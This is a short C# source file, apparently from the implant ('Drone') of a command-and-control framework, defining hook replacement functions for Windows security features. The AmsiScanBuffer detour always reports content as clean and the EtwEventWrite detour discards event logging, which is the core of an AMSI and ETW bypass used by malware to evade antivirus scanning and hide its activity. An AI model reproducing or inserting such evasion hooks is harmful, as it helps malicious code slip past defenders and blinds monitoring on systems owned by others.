using System;

namespace Drone.Utilities;

public static class Detours
{
    public static uint AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, uint length, string contentName,
        IntPtr session, out Win32.AMSI_RESULT result)
    {
        result = Win32.AMSI_RESULT.AMSI_RESULT_CLEAN;
        return 0;
    }

    public static ulong EtwEventWrite(IntPtr regHandle, IntPtr eventDescriptor, ulong userDataCount, IntPtr userData)
    {
        return 0;
    }
}